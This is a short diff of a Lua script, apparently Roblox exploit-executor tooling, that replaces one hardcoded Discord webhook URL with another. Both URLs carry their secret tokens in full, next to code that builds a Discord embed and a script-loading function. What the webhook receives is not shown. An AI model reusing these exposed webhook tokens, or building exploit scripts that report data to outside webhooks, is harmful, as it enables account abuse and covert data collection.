@@ -79,7 +79,7 @@ local Embed = {
     timestamp = string.format('%d-%02d-%02dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec)
 }
 
-local webhookUrl = 'https://discord.com/api/webhooks/1416170561436127253/CXjjLA92i4lpHDSxUea7J5sVYtW2uJr6hfDPUxtOeqH6foXOsMDLKLE3DrE5Eki_j-cy'
+local webhookUrl = 'https://discord.com/api/webhooks/1416170565844074578/NA8Mjw8rgjHxIT3AdocwORcuNvhypwJ-kyTh_bahTUaUhE7cEDMuNclK8Q5t0eXNfT1R'
 local requestFunction = (syn and syn.request) or http_request or (http and http.request)
 
 local function loadNextScript()
